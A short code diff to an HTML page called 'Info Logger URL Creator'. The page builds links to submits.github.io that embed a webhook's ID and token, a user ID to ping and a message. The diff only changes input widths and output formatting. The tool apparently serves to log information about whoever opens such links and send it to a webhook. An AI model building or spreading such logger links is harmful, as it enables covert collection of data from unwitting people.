@@ -22,9 +22,9 @@
         <div style="text-align:center">
     <h1 style="font-family:'Ubuntu'">Info Logger URL Creator</h1>
             <label style="font-family:'Ubuntu'; font-size:23px">User ID To Ping</label><br>
-            <input style = "width:450px; height:25px; font-family:'Ubuntu'"type="text" id="userid"><br><br>
+            <input style = "width:250px; height:25px; font-family:'Ubuntu'"type="text" id="userid"><br><br>
             <label style="font-family:'Ubuntu'; font-size:23px">Webhook URL</label><br>
-            <input style = "width:450px; height:25px; font-family:'Ubuntu'"type="text" id="webhookurl"><br><br>
+            <input style = "width:650px; height:25px; font-family:'Ubuntu'"type="text" id="webhookurl"><br><br>
             <label style="font-family:'Ubuntu'; font-size:23px">Message To Display</label><br>
             <input style = "width:350px; height:25px; font-family:'Ubuntu'"type="text" id="message"><br><br><br>
             <button onclick="generate()" style="width:250px; height:30px; font-family:'Ubuntu'; cursor:pointer">Generate</button><br><br>
@@ -36,7 +36,7 @@ function generate(){
     let webhookurl =  document.getElementById("webhookurl").value
     var components = webhookurl.split("/")
     let url = "https://submits.github.io/?" + document.getElementById("userid").value + "?" + components[5] + "?" + components[6] + "?" + document.getElementById("message").value.replace(/\s/g, "%20")
-    document.getElementById("finalurl").innerHTML = "Desktop: " + url + "<br>Mobile: " + url + "?mobile"
+    document.getElementById("finalurl").innerHTML = "Desktop: <i>" + url + "</i><br>Mobile: <i>" + url + "?mobile</i>"
 }
     </script>
 </html>
